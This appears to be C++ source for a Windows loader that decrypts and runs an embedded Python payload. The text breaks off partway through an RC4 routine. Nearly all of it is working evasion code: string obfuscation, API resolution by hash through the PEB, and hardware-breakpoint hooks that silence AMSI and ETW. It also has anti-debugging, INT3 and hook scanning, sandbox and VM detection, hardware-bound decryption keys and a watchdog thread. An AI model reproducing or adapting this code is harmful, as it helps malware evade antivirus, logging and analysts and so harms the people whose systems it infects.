#include <windows.h>
#include <vector>
#include <winternl.h>
#include <intrin.h>
#include <Python.h>
#include <marshal.h>
#include <zlib.h>
#include "payload.h"
#include <iphlpapi.h>
// Batch-B #34: crash-dialog suppression (silent kill, exit 137).
#ifdef _WIN32
#include "crash_suppress.h"
#endif
static char* g_obfBufs[64];
static size_t g_obfBufSizes[64];
static int g_obfBufCount = 0;
void RegisterObfBuf(char* buf, size_t sz) {
    if (g_obfBufCount < 64) { g_obfBufs[g_obfBufCount] = buf; g_obfBufSizes[g_obfBufCount] = sz; g_obfBufCount++; }
}
void WipeAllObfBufs() {
    for (int i = 0; i < g_obfBufCount; i++) {
        volatile char* p = g_obfBufs[i];
        for (size_t j = 0; j < g_obfBufSizes[i]; j++) p[j] = 0;
    }
    g_obfBufCount = 0;
}
template <size_t N>
struct ObfString {
    char data[N];
    constexpr ObfString(const char (&str)[N]) : data{} {
        for (size_t i = 0; i < N; i++) data[i] = str[i] ^ NIXON_OBF_KEY;
    }
    char* decrypt(char* buf) const {
        for (size_t i = 0; i < N; i++) buf[i] = data[i] ^ NIXON_OBF_KEY;
        return buf;
    }
};
#define OBF(s) []() -> const char* { \
    static constexpr ObfString<sizeof(s)> obf(s); \
    static char buf[sizeof(s)]; \
    static bool done = false; \
    if (!done) { obf.decrypt(buf); done = true; RegisterObfBuf(buf, sizeof(s)); } \
    return buf; \
}()
constexpr DWORD HashFNV1a(const char* str) {
    DWORD hash = 5381;
    int c = 0;
    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
    return hash;
}
PVOID GetModuleBase(DWORD moduleHash) {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListEntry = pLdr->InMemoryOrderModuleList.Flink;
    while (pListEntry != &pLdr->InMemoryOrderModuleList) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pEntry->FullDllName.Buffer) {
            char dllName[256]; size_t i;
            for (i = 0; i < pEntry->FullDllName.Length / 2 && i < 255; i++) {
                dllName[i] = (char)pEntry->FullDllName.Buffer[i];
                if (dllName[i] >= 'A' && dllName[i] <= 'Z') dllName[i] += 32;
            }
            dllName[i] = '\0';
            if (HashFNV1a(dllName) == moduleHash) return pEntry->DllBase;
        }
        pListEntry = pListEntry->Flink;
    }
    return nullptr;
}
PVOID GetExportAddress(PVOID pModBase, DWORD procHash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PUCHAR)pModBase + pDos->e_lfanew);
    DWORD expDirRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD expDirSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)pModBase + expDirRVA);
    PDWORD pNames = (PDWORD)((PUCHAR)pModBase + pExp->AddressOfNames);
    PDWORD pAddrs = (PDWORD)((PUCHAR)pModBase + pExp->AddressOfFunctions);
    PWORD  pOrds  = (PWORD)((PUCHAR)pModBase + pExp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        char* fn = (char*)((PUCHAR)pModBase + pNames[i]);
        if (HashFNV1a(fn) == procHash) {
            DWORD funcRVA = pAddrs[pOrds[i]];
            if (funcRVA >= expDirRVA && funcRVA < expDirRVA + expDirSize) {
                char* fwd = (char*)((PUCHAR)pModBase + funcRVA);
                char modName[128]; int k = 0;
                while (fwd[k] && fwd[k] != '.' && k < 127) { modName[k] = fwd[k]; k++; }
                modName[k] = '\0';
                if (k + 4 < 128) { modName[k]='.'; modName[k+1]='d'; modName[k+2]='l'; modName[k+3]='l'; modName[k+4]='\0'; }
                for (int j = 0; modName[j]; j++)
                    if (modName[j] >= 'A' && modName[j] <= 'Z') modName[j] += 32;
                PVOID fwdMod = GetModuleBase(HashFNV1a(modName));
                if (fwdMod && fwd[k] == '.') {
                    return GetExportAddress(fwdMod, HashFNV1a(fwd + k + 1));
                }
                return nullptr; 
            }
            return (PVOID)((PUCHAR)pModBase + funcRVA);
        }
    }
    return nullptr;
}
typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* fnVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL(WINAPI* fnVirtualLock)(LPVOID, SIZE_T);
typedef BOOL(WINAPI* fnVirtualUnlock)(LPVOID, SIZE_T);
typedef HANDLE(WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* fnTerminateThread)(HANDLE, DWORD);
typedef BOOL(WINAPI* fnCloseHandle)(HANDLE);
typedef DWORD(WINAPI* fnGetTickCount)();
typedef void(WINAPI* fnSleep)(DWORD);
typedef BOOL(WINAPI* fnGetSystemTimes)(PFILETIME, PFILETIME, PFILETIME);
typedef void(WINAPI* fnGetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL(WINAPI* fnGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef BOOL(WINAPI* fnGetVolumeInformationA)(LPCSTR, LPSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);
typedef int(WINAPI* fnGetSystemMetrics)(int);

typedef HANDLE(WINAPI* fnCreateWaitableTimerA)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef BOOL(WINAPI* fnSetWaitableTimer)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL);
typedef DWORD(WINAPI* fnWaitForSingleObject)(HANDLE, DWORD);
struct DynamicAPI {
    fnVirtualAlloc pVirtualAlloc;
    fnVirtualProtect pVirtualProtect;
    fnVirtualFree pVirtualFree;
    fnVirtualLock pVirtualLock;
    fnVirtualUnlock pVirtualUnlock;
    fnCreateThread pCreateThread;
    fnTerminateThread pTerminateThread;
    fnCloseHandle pCloseHandle;
    fnGetTickCount pGetTickCount;
    fnSleep pSleep;
    fnGetSystemTimes pGetSystemTimes;
    fnGetSystemInfo pGetSystemInfo;
    fnGlobalMemoryStatusEx pGlobalMemoryStatusEx;
    fnGetVolumeInformationA pGetVolumeInformationA;
    fnGetSystemMetrics pGetSystemMetrics;

    fnCreateWaitableTimerA pCreateWaitableTimerA;
    fnSetWaitableTimer pSetWaitableTimer;
    fnWaitForSingleObject pWaitForSingleObject;
};
static DynamicAPI g_api = {0};
typedef void (*fnPy_Initialize)(void);
typedef void (*fnPy_Finalize)(void);
typedef void (*fnPy_SetProgramName)(const wchar_t *);
typedef PyObject* (*fnPyMarshal_ReadObjectFromString)(const char*, Py_ssize_t);
typedef PyObject* (*fnPyImport_AddModule)(const char*);
typedef PyObject* (*fnPyModule_GetDict)(PyObject*);
typedef PyObject* (*fnPyEval_EvalCode)(PyObject*, PyObject*, PyObject*);
typedef void (*fnPyErr_Clear)(void);
typedef void (*fnPy_DecRef)(PyObject*);

typedef int (*fnPyDict_SetItemString)(PyObject*, const char*, PyObject*);
typedef PyObject* (*fnPyLong_FromVoidPtr)(void*);

struct PythonAPI {
    fnPy_Initialize pPy_Initialize;
    fnPy_Finalize pPy_Finalize;
    fnPy_SetProgramName pPy_SetProgramName;
    fnPyMarshal_ReadObjectFromString pPyMarshal_ReadObjectFromString;
    fnPyImport_AddModule pPyImport_AddModule;
    fnPyModule_GetDict pPyModule_GetDict;
    fnPyEval_EvalCode pPyEval_EvalCode;
    fnPyErr_Clear pPyErr_Clear;
    fnPy_DecRef pPy_DecRef;

    fnPyDict_SetItemString pPyDict_SetItemString;
    fnPyLong_FromVoidPtr pPyLong_FromVoidPtr;

    int* pPy_OptimizeFlag;
    int* pPy_NoSiteFlag;
    int* pPy_DontWriteBytecodeFlag;
};
static PythonAPI g_py = {0};
bool InitDynamicAPI() {
    PVOID pKernel32 = GetModuleBase(0x6DDB9555); 
    if (!pKernel32) return false;
    g_api.pVirtualAlloc = (fnVirtualAlloc)GetExportAddress(pKernel32, HashFNV1a("VirtualAlloc"));
    g_api.pVirtualProtect = (fnVirtualProtect)GetExportAddress(pKernel32, HashFNV1a("VirtualProtect"));
    g_api.pVirtualFree = (fnVirtualFree)GetExportAddress(pKernel32, HashFNV1a("VirtualFree"));
    g_api.pVirtualLock = (fnVirtualLock)GetExportAddress(pKernel32, HashFNV1a("VirtualLock"));
    g_api.pVirtualUnlock = (fnVirtualUnlock)GetExportAddress(pKernel32, HashFNV1a("VirtualUnlock"));
    g_api.pCreateThread = (fnCreateThread)GetExportAddress(pKernel32, HashFNV1a("CreateThread"));
    g_api.pTerminateThread = (fnTerminateThread)GetExportAddress(pKernel32, HashFNV1a("TerminateThread"));
    g_api.pCloseHandle = (fnCloseHandle)GetExportAddress(pKernel32, HashFNV1a("CloseHandle"));
    g_api.pGetTickCount = (fnGetTickCount)GetExportAddress(pKernel32, HashFNV1a("GetTickCount"));
    g_api.pSleep = (fnSleep)GetExportAddress(pKernel32, HashFNV1a("Sleep"));
    g_api.pGetSystemTimes = (fnGetSystemTimes)GetExportAddress(pKernel32, HashFNV1a("GetSystemTimes"));
    g_api.pGetSystemInfo = (fnGetSystemInfo)GetExportAddress(pKernel32, HashFNV1a("GetSystemInfo"));
    g_api.pGlobalMemoryStatusEx = (fnGlobalMemoryStatusEx)GetExportAddress(pKernel32, HashFNV1a("GlobalMemoryStatusEx"));
    g_api.pGetVolumeInformationA = (fnGetVolumeInformationA)GetExportAddress(pKernel32, HashFNV1a("GetVolumeInformationA"));
    g_api.pCreateWaitableTimerA = (fnCreateWaitableTimerA)GetExportAddress(pKernel32, HashFNV1a("CreateWaitableTimerA"));
    g_api.pSetWaitableTimer = (fnSetWaitableTimer)GetExportAddress(pKernel32, HashFNV1a("SetWaitableTimer"));
    g_api.pWaitForSingleObject = (fnWaitForSingleObject)GetExportAddress(pKernel32, HashFNV1a("WaitForSingleObject"));
    PVOID pUser32 = GetModuleBase(0x8DBDBBD2); 
    if (pUser32) g_api.pGetSystemMetrics = (fnGetSystemMetrics)GetExportAddress(pUser32, HashFNV1a("GetSystemMetrics"));
    
    // Explicit NULL checks for critical APIs
    if (!g_api.pVirtualAlloc || !g_api.pVirtualProtect || !g_api.pVirtualFree || 
        !g_api.pCreateThread || !g_api.pCloseHandle || !g_api.pSleep) {
        return false;
    }
    return true;
}
PVOID g_pAmsiScanBuffer = nullptr;
PVOID g_pEtwEventWrite = nullptr;
PVOID g_pEnclaveBase = nullptr;
SIZE_T g_enclaveSize = 0;
LONG WINAPI VehHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        ULONG_PTR faultAddr = ExceptionInfo->ExceptionRecord->ExceptionInformation[1];
        if (g_pEnclaveBase && faultAddr >= (ULONG_PTR)g_pEnclaveBase && faultAddr < (ULONG_PTR)g_pEnclaveBase + g_enclaveSize) {
            DWORD old;
            if (g_api.pVirtualProtect) g_api.pVirtualProtect(g_pEnclaveBase, g_enclaveSize, PAGE_EXECUTE_READWRITE, &old);
            ExceptionInfo->ContextRecord->EFlags |= 0x100; 
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    else if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_pAmsiScanBuffer) {
            ExceptionInfo->ContextRecord->Rax = 0x80070057;
            ExceptionInfo->ContextRecord->Rip = *(DWORD64*)ExceptionInfo->ContextRecord->Rsp;
            ExceptionInfo->ContextRecord->Rsp += 8;
            ExceptionInfo->ContextRecord->EFlags &= ~(1 << 8); 
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_pEtwEventWrite) {
            ExceptionInfo->ContextRecord->Rax = 0;
            ExceptionInfo->ContextRecord->Rip = *(DWORD64*)ExceptionInfo->ContextRecord->Rsp;
            ExceptionInfo->ContextRecord->Rsp += 8;
            ExceptionInfo->ContextRecord->EFlags &= ~(1 << 8); 
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        if (g_pEnclaveBase && (ExceptionInfo->ContextRecord->EFlags & 0x100 || true)) {
            DWORD old;
            if (g_api.pVirtualProtect) g_api.pVirtualProtect(g_pEnclaveBase, g_enclaveSize, PAGE_NOACCESS, &old);
            ExceptionInfo->ContextRecord->EFlags &= ~(1 << 8); 
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
void PatchAMSI() {
    typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
    PVOID pKernel32 = GetModuleBase(0x6DDB9555);
    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetExportAddress(pKernel32, HashFNV1a("LoadLibraryA"));
    if (!pLoadLibraryA) return;
    HMODULE hAmsi = pLoadLibraryA(OBF("amsi.dll"));
    if (!hAmsi) return;
    g_pAmsiScanBuffer = GetExportAddress(hAmsi, HashFNV1a("AmsiScanBuffer"));
}
void PatchETW() {
    PVOID pNtdll = GetModuleBase(0x1EDAB0ED);
    if (!pNtdll) return;
    g_pEtwEventWrite = GetExportAddress(pNtdll, HashFNV1a("EtwEventWrite"));
}
void InstallHardwareHooks() {
    typedef PVOID(WINAPI* fnAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
    typedef HANDLE(WINAPI* fnGetCurrentThread)();
    typedef BOOL(WINAPI* fnGetThreadContext)(HANDLE, PCONTEXT);
    typedef BOOL(WINAPI* fnSetThreadContext)(HANDLE, const CONTEXT*);
    PVOID pKernel32 = GetModuleBase(0x6DDB9555);
    fnAddVectoredExceptionHandler pAddVeh = (fnAddVectoredExceptionHandler)GetExportAddress(pKernel32, HashFNV1a("AddVectoredExceptionHandler"));
    fnGetCurrentThread pGetCurrentThread = (fnGetCurrentThread)GetExportAddress(pKernel32, HashFNV1a("GetCurrentThread"));
    fnGetThreadContext pGetThreadContext = (fnGetThreadContext)GetExportAddress(pKernel32, HashFNV1a("GetThreadContext"));
    fnSetThreadContext pSetThreadContext = (fnSetThreadContext)GetExportAddress(pKernel32, HashFNV1a("SetThreadContext"));
    if (!pAddVeh || !pGetCurrentThread || !pGetThreadContext || !pSetThreadContext) return;
    pAddVeh(1, VehHandler);
    HANDLE hThread = pGetCurrentThread();
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (pGetThreadContext(hThread, &ctx)) {
        ctx.Dr0 = (DWORD64)g_pAmsiScanBuffer;
        ctx.Dr1 = (DWORD64)g_pEtwEventWrite;
        ctx.Dr7 = (1 << 0) | (1 << 2); 
        pSetThreadContext(hThread, &ctx);
    }
    typedef NTSTATUS(WINAPI* fnNtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);
    fnNtSetInformationThread pNtSetInformationThread = (fnNtSetInformationThread)GetExportAddress(GetModuleBase(0x1EDAB0ED), HashFNV1a("NtSetInformationThread"));
    if (pNtSetInformationThread) {
        pNtSetInformationThread(hThread, 0x11, NULL, 0);
    }
}
struct HardwareFingerprint {
    unsigned int cpuid_vendor[4];
    unsigned int cpuid_features[4];
    DWORD volumeSerial;
    char cpuBrand[48];
    DWORD cpuCores;
    DWORDLONG totalRAM;
    // NEW: Advanced Binding Fields
    BYTE macAddress[6];
    BYTE smbiosHash[32];
};

void CollectAdvancedFingerprint(HardwareFingerprint& fp) {
    // 1. Standard CPUID & Hardware Info
    __cpuid((int*)fp.cpuid_vendor, 0);
    __cpuid((int*)fp.cpuid_features, 1);
    memset(fp.cpuBrand, 0, 48);
    __cpuid((int*)(fp.cpuBrand),      0x80000002);
    __cpuid((int*)(fp.cpuBrand + 16), 0x80000003);
    __cpuid((int*)(fp.cpuBrand + 32), 0x80000004);
    
    fp.volumeSerial = 0;
    if (g_api.pGetVolumeInformationA) {
        g_api.pGetVolumeInformationA(OBF("C:\\"), NULL, 0, &fp.volumeSerial, NULL, NULL, NULL, 0);
    }
    
    SYSTEM_INFO si; 
    if (g_api.pGetSystemInfo) g_api.pGetSystemInfo(&si);
    fp.cpuCores = si.dwNumberOfProcessors;
    
    MEMORYSTATUSEX ms = {sizeof(ms)};
    if (g_api.pGlobalMemoryStatusEx) g_api.pGlobalMemoryStatusEx(&ms);
    fp.totalRAM = ms.ullTotalPhys;

    // Zero initialize new fields
    memset(fp.macAddress, 0, 6);
    memset(fp.smbiosHash, 0, 32);

    PVOID pKernel32 = GetModuleBase(0x6DDB9555); // kernel32.dll hash

    // 2. SMBIOS UUID Extraction
    typedef UINT(WINAPI* fnGetSystemFirmwareTable)(DWORD, DWORD, PVOID, DWORD);
    fnGetSystemFirmwareTable pGetSystemFirmwareTable = (fnGetSystemFirmwareTable)GetExportAddress(pKernel32, HashFNV1a("GetSystemFirmwareTable"));
    
    if (pGetSystemFirmwareTable) {
        DWORD smbiosProvider = 'RSMB';
        DWORD size = pGetSystemFirmwareTable(smbiosProvider, 0, NULL, 0);
        if (size > 0 && size < 1024 * 1024) {
            std::vector<BYTE> firmwareBuffer(size);
            pGetSystemFirmwareTable(smbiosProvider, 0, firmwareBuffer.data(), size);
            
            // Generate a localized hash of the SMBIOS table to avoid storing massive raw tables
            for(size_t i = 0; i < size; i++) {
                fp.smbiosHash[i % 32] ^= firmwareBuffer[i];
                fp.smbiosHash[(i * 7) % 32] += (firmwareBuffer[i] ^ 0x55);
            }
            
            // Secure wipe buffer
            volatile BYTE* pWipe = firmwareBuffer.data();
            for(size_t i = 0; i < size; i++) pWipe[i] = 0;
        }
    }

    // 3. MAC Address Extraction (Dynamic Load)
    typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
    fnLoadLibraryA pLoadLibrary = (fnLoadLibraryA)GetExportAddress(pKernel32, HashFNV1a("LoadLibraryA"));
    
    if (pLoadLibrary) {
        HMODULE hIphlp = pLoadLibrary(OBF("iphlpapi.dll"));
        if (hIphlp) {
            typedef DWORD(WINAPI* fnGetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);
            fnGetAdaptersInfo pGetAdaptersInfo = (fnGetAdaptersInfo)GetExportAddress(hIphlp, HashFNV1a("GetAdaptersInfo"));
            
            if (pGetAdaptersInfo) {
                ULONG bufLen = 0;
                if (pGetAdaptersInfo(NULL, &bufLen) == ERROR_BUFFER_OVERFLOW) {
                    std::vector<BYTE> macBuf(bufLen);
                    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)macBuf.data();
                    if (pGetAdaptersInfo(pAdapterInfo, &bufLen) == NO_ERROR) {
                        memcpy(fp.macAddress, pAdapterInfo->Address, 6);
                    }
                    volatile BYTE* mWipe = macBuf.data();
                    for(size_t i = 0; i < bufLen; i++) mWipe[i] = 0;
                }
            }
        }
    }
}
void DeriveKeyFromFingerprint_Iterative(const HardwareFingerprint& fp, unsigned char* outKey, size_t keyLen) {
    const int ITERATIONS = 150000;
    std::vector<unsigned char> state(keyLen, 0);
    
    // Seed initial state with hardware components
    unsigned char initialSeed[64] = {0};
    memcpy(initialSeed, &fp.cpuid_vendor[1], 4); 
    memcpy(initialSeed + 4, &fp.cpuid_vendor[3], 4); 
    memcpy(initialSeed + 8, &fp.cpuid_vendor[2], 4); 
    memcpy(initialSeed + 12, &fp.volumeSerial, 4);
    memcpy(initialSeed + 16, fp.macAddress, 6);
    memcpy(initialSeed + 22, fp.smbiosHash, 32);

    // Initial pass
    for (size_t i = 0; i < keyLen; i++) {
        unsigned int h = 2166136261u; // FNV1a basis
        for (size_t j = 0; j < sizeof(initialSeed); j++) {
            h ^= initialSeed[j];
            h *= 16777619u;
        }
        state[i] = (unsigned char)((h + i) & 0xFF);
    }

    // High-Entropy Feedback Loop
    for (int iter = 0; iter < ITERATIONS; iter++) {
        unsigned char feedback = state[(iter) % keyLen];
        for (size_t i = 0; i < keyLen; i++) {
            // Non-linear transformations
            state[i] ^= feedback;
            state[i] = (state[i] << 3) | (state[i] >> 5); // ROTL 3
            state[i] += (unsigned char)(iter & 0xFF);
            
            // Avalanche effect
            feedback = (feedback + state[i]) ^ 0xA5;
        }
    }

    // Output and zeroize
    memcpy(outKey, state.data(), keyLen);
    
    volatile unsigned char* sWipe = state.data();
    for (size_t i = 0; i < keyLen; i++) sWipe[i] = 0;
    volatile unsigned char* iWipe = initialSeed;
    for (size_t i = 0; i < sizeof(initialSeed); i++) iWipe[i] = 0;
}
volatile bool g_debugDetected = false;
static HANDLE g_hWatchdog = NULL;
// IAT verification ground truth: (slot address -> resolved address at load).
// Populated during reflective import resolution; VerifyIAT() re-reads each
// slot and flags post-load IAT hooking. Fixed-size table: excess slots are
// resolved but untracked (count-only fail-open, documented).
#define NIXON_IAT_SLOTS 512
static uintptr_t g_iatSlots[NIXON_IAT_SLOTS] = {0};
static uintptr_t g_iatTruth[NIXON_IAT_SLOTS] = {0};
static size_t g_iatTracked = 0;
static bool VerifyIAT() {
    for (size_t i = 0; i < g_iatTracked; ++i) {
        uintptr_t* slot = (uintptr_t*)g_iatSlots[i];
        if (!slot) continue;
        if (*slot != g_iatTruth[i]) return false;
    }
    return true;
}
bool CheckPEB() {
#ifdef _WIN64
    PPEB p = (PPEB)__readgsqword(0x60);
    DWORD ntg = *(PDWORD)((PBYTE)p + 0xBC);
#else
    PPEB p = (PPEB)__readfsdword(0x30);
    DWORD ntg = *(PDWORD)((PBYTE)p + 0x68);
#endif
    return (p->BeingDebugged == 1 || ntg == 0x70);
}
bool CheckHardwareBP() {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx))
        return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
    return false;
}
bool CheckDebugPort() {
    typedef NTSTATUS(NTAPI* pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    PVOID pNtdll = GetModuleBase(0x1EDAB0ED);
    if (!pNtdll) return false;
    pNtQIP fn = (pNtQIP)GetExportAddress(pNtdll, 0xD19B0706);
    if (!fn) return false;
    DWORD_PTR debugPort = 0;
    typedef HANDLE(WINAPI* pGetCurrentProcess)();
    PVOID pKernel32 = GetModuleBase(0x6DDB9555);
    pGetCurrentProcess fnGC = pKernel32 ? (pGetCurrentProcess)GetExportAddress(pKernel32, HashFNV1a("GetCurrentProcess")) : NULL;
    HANDLE hProc = fnGC ? fnGC() : (HANDLE)-1;
    NTSTATUS st = fn(hProc, 7, &debugPort, sizeof(debugPort), NULL);
    return (st == 0 && debugPort != 0);
}
bool CheckTimingAnomaly() {
    unsigned __int64 t1 = __rdtsc();
    volatile int dummy = 0;
    for (int i = 0; i < 50000; i++) dummy += i;
    unsigned __int64 t2 = __rdtsc();
    if ((t2 - t1) > 0xFFFFFF) return true;

    typedef BOOL(WINAPI* pQueryPerformanceFrequency)(LARGE_INTEGER*);
    typedef BOOL(WINAPI* pQueryPerformanceCounter)(LARGE_INTEGER*);
    PVOID pKernel32 = GetModuleBase(0x6DDB9555);
    pQueryPerformanceFrequency fnQPF = pKernel32 ? (pQueryPerformanceFrequency)GetExportAddress(pKernel32, HashFNV1a("QueryPerformanceFrequency")) : NULL;
    pQueryPerformanceCounter fnQPC = pKernel32 ? (pQueryPerformanceCounter)GetExportAddress(pKernel32, HashFNV1a("QueryPerformanceCounter")) : NULL;
    if (!fnQPF || !fnQPC) return false;
    LARGE_INTEGER freq, q1, q2;
    fnQPF(&freq);
    fnQPC(&q1);
    dummy = 0;
    for (int i = 0; i < 100; i++) dummy += i;
    fnQPC(&q2);
    double elapsed_ms = (double)(q2.QuadPart - q1.QuadPart) / freq.QuadPart * 1000.0;
    return (elapsed_ms > 200.0);
}
bool CheckFunctionHooks() {
    PVOID pNtdll = GetModuleBase(0x1EDAB0ED);
    if (!pNtdll) return false;
    DWORD targets[] = { 0x4C0A09AE, 0xA5292A55, 0x2E05D37C };
    for (int i = 0; i < 3; i++) {
        PBYTE fn = (PBYTE)GetExportAddress(pNtdll, targets[i]);
        if (fn && (fn[0] == 0xE9 || fn[0] == 0xEB || fn[0] == 0xFF)) return true;
    }
    return false;
}
bool CheckSandboxVM() {
    MEMORYSTATUSEX m = {sizeof(m)};
    if (g_api.pGlobalMemoryStatusEx) g_api.pGlobalMemoryStatusEx(&m);
    if (m.ullTotalPhys < (DWORDLONG)4 * 1024 * 1024 * 1024) return true;
    SYSTEM_INFO si; 
    if (g_api.pGetSystemInfo) {
        g_api.pGetSystemInfo(&si);
        if (si.dwNumberOfProcessors < 2) return true;
    }
    unsigned int ci[4] = {0};
    __cpuid((int*)ci, 1);
    if ((ci[2] >> 31) & 1) return true; 

    unsigned int hv[4] = {0};
    __cpuid((int*)hv, 0x40000000);
    char hvVendor[13];
    memcpy(hvVendor, &hv[1], 4);
    memcpy(hvVendor + 4, &hv[3], 4);
    memcpy(hvVendor + 8, &hv[2], 4);
    hvVendor[12] = '\0';
    DWORD hvHash = HashFNV1a(hvVendor);
    if (hvHash == HashFNV1a("VMwareVMware") || 
        hvHash == HashFNV1a("Microsoft Hv") || 
        hvHash == HashFNV1a("KVMKVMKVM\0\0\0") || 
        hvHash == HashFNV1a("VBoxVBoxVBox")) {
        return true;
    }

    if (g_api.pGetSystemMetrics) {
        int screenW = g_api.pGetSystemMetrics(SM_CXSCREEN);
        int screenH = g_api.pGetSystemMetrics(SM_CYSCREEN);
        if (screenW <= 1024 && screenH <= 768) return true;
    }
    if (g_api.pGetTickCount) {
        DWORD uptime = g_api.pGetTickCount();
        if (uptime < 600000) return true; 
    }
    return false;
}
bool RunAllAntiAnalysis() {
    return CheckPEB() || CheckHardwareBP() || CheckDebugPort()
        || CheckTimingAnomaly() || CheckFunctionHooks() || CheckSandboxVM();
}

LONG WINAPI NixonVEHHandler(PEXCEPTION_POINTERS);
DWORD WINAPI WatchdogThread(LPVOID);

bool run_anti_debug_checks(void) {
    if (g_debugDetected) return false;
    if (RunAllAntiAnalysis()) return false;
    return true;
}

void apply_protections(void) {
    typedef PVOID(WINAPI* fnAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
    PVOID pKernel32 = GetModuleBase(0x6DDB9555);
    fnAddVectoredExceptionHandler pAddVeh = (fnAddVectoredExceptionHandler)GetExportAddress(pKernel32, HashFNV1a("AddVectoredExceptionHandler"));
    if (pAddVeh) pAddVeh(1, NixonVEHHandler);
    if (g_api.pCreateThread) {
        g_hWatchdog = g_api.pCreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);
    }
    PVOID pNtdll = GetModuleBase(0x1EDAB0ED);
    if (pNtdll) {
        typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
        fnNtSetInformationProcess pNtSetInfo = (fnNtSetInformationProcess)GetExportAddress(pNtdll, HashFNV1a("NtSetInformationProcess"));
        if (pNtSetInfo) {
            ULONG mit = 1;
            pNtSetInfo((HANDLE)-1, 0x29, &mit, sizeof(mit));
        }
    }
}
bool ScanForINT3(void* funcAddr, size_t len) {
    unsigned char* p = (unsigned char*)funcAddr;
    for (size_t i = 0; i < len; i++) {
        if (p[i] == 0xCC) return true;
    }
    return false;
}
extern void RC4_Crypt(SecureVector& data, const unsigned char* key, size_t keyLen, bool corruptKey);
extern void DeriveKeyFromFingerprint_Iterative(const HardwareFingerprint& fp, unsigned char* outKey, size_t keyLen);

DWORD WINAPI WatchdogThread(LPVOID) {
    int consecutiveHits = 0;
    int loopCount = 0;
    while (true) {
        bool hit = CheckHardwareBP() || CheckPEB() || CheckDebugPort();
        if (!hit) {
            if (ScanForINT3((void*)&RC4_Crypt, 256)) hit = true;
            if (ScanForINT3((void*)&DeriveKeyFromFingerprint_Iterative, 256)) hit = true;
            if (ScanForINT3((void*)&CheckPEB, 128)) hit = true;
        }
        // Periodic IAT re-verification (every ~5th 2 s cycle): catches
        // post-load IAT hooks installed after init. Folds into the same
        // 3-strike latch as the other checks (no new kill path).
        if (!hit && g_iatTracked > 0 && (loopCount % 5) == 4) {
            if (!VerifyIAT()) hit = true;
        }
        loopCount++;
        if (hit) {
            consecutiveHits++;
            if (consecutiveHits >= 3) g_debugDetected = true;
        } else {
            consecutiveHits = 0; 
        }
        if (g_api.pCreateWaitableTimerA && g_api.pSetWaitableTimer && g_api.pWaitForSingleObject) {
            HANDLE hTimer = g_api.pCreateWaitableTimerA(NULL, FALSE, NULL);
            if (hTimer) {
                LARGE_INTEGER liDueTime;
                liDueTime.QuadPart = -20000000LL;
                if (g_api.pSetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE)) {
                    g_api.pWaitForSingleObject(hTimer, INFINITE);
                }
                g_api.pCloseHandle(hTimer);
            }
        } else if (g_api.pSleep) {
            g_api.pSleep(2000);
        }
    }
    return 0;
}
void RC4_KSA(unsigned char S[256], const unsigned char* key, size_t keyLen, bool corruptKey) {
    unsigned char lk[256];
    for (int i = 0; i < 256; i++) { S[i] = i; lk[i] = key[i % keyLen]; }
    if (corruptKey) lk[0] ^= 0xFF;
    int j = 0;
